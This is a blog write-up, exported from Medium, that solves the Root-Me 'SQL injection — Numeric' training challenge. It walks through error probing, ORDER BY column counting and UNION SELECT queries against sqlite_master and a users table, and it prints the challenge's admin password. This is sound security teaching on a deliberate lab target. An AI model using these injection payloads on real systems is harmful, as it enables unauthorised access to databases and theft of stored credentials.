<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Root-Me Writeup : SQL injection — Numeric</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">Root-Me Writeup : SQL injection — Numeric</h1>
</header>
<section data-field="subtitle" class="p-summary">
Initial Assessment
</section>
<section data-field="body" class="e-content">
<section name="9d3c" class="section section--body section--first"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="5461" id="5461" class="graf graf--h3 graf--leading graf--title">Root-Me Writeup : SQL injection — Numeric</h3><figure name="3bba" id="3bba" class="graf graf--figure graf-after--h3"><img class="graf-image" data-image-id="1*vzWi2hZCma-ZqhJNjB9J_w.png" data-width="1084" data-height="318" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*vzWi2hZCma-ZqhJNjB9J_w.png"></figure><h3 name="0fd3" id="0fd3" class="graf graf--h3 graf-after--figure">Initial Assessment</h3><p name="4a4c" id="4a4c" class="graf graf--p graf-after--h3">I started by browsing the <strong class="markup--strong markup--p-strong">News (Accueil)</strong> section of the website.<br> When selecting a news item, I noticed that each entry communicates directly with the database using the following URL pattern:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="bae8" id="bae8" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1</span></pre><p name="1946" id="1946" class="graf graf--p graf-after--pre graf--trailing">This indicates that the <code class="markup--code markup--p-code">news_id</code> parameter is used in a database query.</p></div></div></section><section name="3854" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="041f" id="041f" class="graf graf--h3 graf--leading">Initial Testing</h3><p name="43a4" id="43a4" class="graf graf--p graf-after--h3">To test for SQL injection, I supplied a basic SQL payload:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="011a" id="011a" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=<span class="hljs-string">&#x27;27--</span></span></pre><figure name="156c" id="156c" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*ftScrd5W_mDNJSJ_0PUWSA.png" data-width="1365" data-height="497" src="https://cdn-images-1.medium.com/max/800/1*ftScrd5W_mDNJSJ_0PUWSA.png"></figure><p name="8883" id="8883" class="graf graf--p graf-after--figure graf--trailing">This is a standard SQLi test to observe how the database reacts to malformed input.</p></div></div></section><section name="d9c6" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="7579" id="7579" class="graf graf--h3 graf--leading">Error Analysis</h3><p name="3405" id="3405" class="graf graf--p graf-after--h3">The application returned the following error:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="vbnet" name="e0b4" id="e0b4" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-symbol">Warning:</span> SQLite3::query(): Unable <span class="hljs-keyword">to</span> prepare statement: <span class="hljs-number">1</span>, unrecognized token: <span class="hljs-string">&quot;\&quot;</span> <br /><span class="hljs-keyword">in</span> /challenge/web-serveur/ch18/index.php <span class="hljs-keyword">on</span> line <span class="hljs-number">80</span></span></pre><p name="e6a1" id="e6a1" class="graf graf--p graf-after--pre">This error is <strong class="markup--strong markup--p-strong">very verbose</strong>, which is useful. From this response, we can conclude:</p><ul class="postList"><li name="64b1" id="64b1" class="graf graf--li graf-after--p">The backend database is <strong class="markup--strong markup--li-strong">SQLite3</strong></li><li name="2c14" id="2c14" class="graf graf--li graf-after--li">The application is vulnerable to <strong class="markup--strong markup--li-strong">SQL Injection</strong></li><li name="2249" id="2249" class="graf graf--li graf-after--li graf--trailing">User input is not properly sanitized or parameterized</li></ul></div></div></section><section name="3303" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="99be" id="99be" class="graf graf--h3 graf--leading">Challenge Goal</h3><p name="f4fc" id="f4fc" class="graf graf--p graf-after--h3">The challenge description asks us to:</p><blockquote name="4e17" id="4e17" class="graf graf--blockquote graf-after--p"><strong class="markup--strong markup--blockquote-strong"><em class="markup--em markup--blockquote-em">Retrieve the administrator password</em></strong></blockquote><p name="f1be" id="f1be" class="graf graf--p graf-after--blockquote graf--trailing">The challenge title, <strong class="markup--strong markup--p-strong">“SQL Injection — Numeric”</strong>, suggests that the vulnerable parameter expects a <strong class="markup--strong markup--p-strong">numeric value</strong>, not a string.</p></div></div></section><section name="925f" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="cf61" id="cf61" class="graf graf--h3 graf--leading">Understanding Numeric SQL Injection</h3><p name="f063" id="f063" class="graf graf--p graf-after--h3">A <strong class="markup--strong markup--p-strong">numeric SQL injection</strong> occurs when user input is directly embedded into a SQL query where a number is expected.<br> Unlike string-based SQLi, <strong class="markup--strong markup--p-strong">quotation marks are not required</strong>, because the input remains within a numeric context.</p><p name="988f" id="988f" class="graf graf--p graf-after--p">Example vulnerable query:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="sql" name="4d67" id="4d67" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> news <span class="hljs-keyword">WHERE</span> news_id <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;</span></pre><p name="e94b" id="e94b" class="graf graf--p graf-after--pre graf--trailing">Since <code class="markup--code markup--p-code">news_id</code> is numeric, injecting <code class="markup--code markup--p-code">&#39;</code> is unnecessary and may even break the query.</p></div></div></section><section name="7f6d" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="84b7" id="84b7" class="graf graf--h3 graf--leading">Determining the Number of Columns</h3><p name="ac88" id="ac88" class="graf graf--p graf-after--h3">To perform a UNION-based SQL injection, I first needed to determine the number of columns in the original query.</p><p name="6ba1" id="6ba1" class="graf graf--p graf-after--p">I used an <code class="markup--code markup--p-code">ORDER BY</code> test:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="sql" name="49b7" id="49b7" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">GET</span> <span class="hljs-operator">/</span>web<span class="hljs-operator">-</span>serveur<span class="hljs-operator">/</span>ch18<span class="hljs-operator">/</span>?action<span class="hljs-operator">=</span>news<span class="hljs-operator">&amp;</span>news_id<span class="hljs-operator">=</span><span class="hljs-number">3</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">4</span><span class="hljs-comment">--</span></span></pre><figure name="94e9" id="94e9" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*VzF2Iq-XBjGvpT7vfb7L-g.png" data-width="1365" data-height="645" src="https://cdn-images-1.medium.com/max/800/1*VzF2Iq-XBjGvpT7vfb7L-g.png"></figure><p name="15d0" id="15d0" class="graf graf--p graf-after--figure">This resulted in the following error:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="sql" name="9f7f" id="9f7f" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">SQLite3::query(): Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">prepare</span> statement: <br /><span class="hljs-number">1</span>st <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> term <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-operator">-</span> should be <span class="hljs-keyword">between</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">3</span></span></pre><p name="9da1" id="9da1" class="graf graf--p graf-after--pre graf--trailing">This confirms that the query contains <strong class="markup--strong markup--p-strong">3 columns</strong>.</p></div></div></section><section name="cef6" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="f4ce" id="f4ce" class="graf graf--h3 graf--leading">Extracting Database Structure</h3><p name="7400" id="7400" class="graf graf--p graf-after--h3">SQLite stores schema information in the <code class="markup--code markup--p-code">sqlite_master</code> table.<br> Using this, I extracted table definitions with a UNION query:</p><p name="b2e9" id="b2e9" class="graf graf--p graf-after--p">source: <a href="https://www.sqlite.org/schematab.html" data-href="https://www.sqlite.org/schematab.html" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://www.sqlite.org/schematab.html</a></p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="sql" name="d5a3" id="d5a3" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">GET</span> <span class="hljs-operator">/</span>web<span class="hljs-operator">-</span>serveur<span class="hljs-operator">/</span>ch18<span class="hljs-operator">/</span>?action<span class="hljs-operator">=</span>news<span class="hljs-operator">&amp;</span>news_id<span class="hljs-operator">=</span><span class="hljs-number">3</span> <br /><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>, <span class="hljs-keyword">sql</span>, <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">FROM</span> sqlite_master<span class="hljs-comment">--</span></span></pre><p name="5443" id="5443" class="graf graf--p graf-after--pre"><strong class="markup--strong markup--p-strong">Response:</strong></p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="sql" name="7955" id="7955" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users(username TEXT, password TEXT, <span class="hljs-keyword">Year</span> <span class="hljs-type">INTEGER</span>)</span></pre><figure name="9f50" id="9f50" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*X5C9fG8VtY3KTOIkoS6GBw.png" data-width="1365" data-height="606" src="https://cdn-images-1.medium.com/max/800/1*X5C9fG8VtY3KTOIkoS6GBw.png"></figure><p name="5077" id="5077" class="graf graf--p graf-after--figure graf--trailing">This reveals a <code class="markup--code markup--p-code">users</code> table containing usernames and passwords.</p></div></div></section><section name="5d6a" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="2dde" id="2dde" class="graf graf--h3 graf--leading">Dumping Credentials</h3><p name="e855" id="e855" class="graf graf--p graf-after--h3">With the table structure known, I extracted user credentials:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="sql" name="211f" id="211f" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">GET</span> <span class="hljs-operator">/</span>web<span class="hljs-operator">-</span>serveur<span class="hljs-operator">/</span>ch18<span class="hljs-operator">/</span>?action<span class="hljs-operator">=</span>news<span class="hljs-operator">&amp;</span>news_id<span class="hljs-operator">=</span><span class="hljs-number">3</span> <br /><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>, username, password <span class="hljs-keyword">FROM</span> users<span class="hljs-comment">--</span></span></pre><figure name="d221" id="d221" class="graf graf--figure graf-after--pre graf--trailing"><img class="graf-image" data-image-id="1*cjHuqteYf07wLxI5zzto2A.png" data-width="1365" data-height="640" src="https://cdn-images-1.medium.com/max/800/1*cjHuqteYf07wLxI5zzto2A.png"></figure></div></div></section><section name="ed26" class="section section--body section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="ed78" id="ed78" class="graf graf--h3 graf--leading">Result</h3><p name="cdc3" id="cdc3" class="graf graf--p graf-after--h3"><strong class="markup--strong markup--p-strong">Administrator credentials retrieved:</strong></p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="yaml" name="fc96" id="fc96" class="graf graf--pre graf-after--p graf--trailing graf--preV2"><span class="pre--content"><span class="hljs-attr">admin :</span> <span class="hljs-string">aTlkJYLjcbLmue3</span></span></pre></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@conan0s4" class="p-author h-card">Alexander Sapo</a> on <a href="https://medium.com/p/59f0116b5326"><time class="dt-published" datetime="2025-12-31T08:54:33.157Z">December 31, 2025</time></a>.</p><p><a href="https://medium.com/@conan0s4/root-me-writeup-sql-injection-numeric-59f0116b5326" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on February 7, 2026.</p></footer></article></body></html>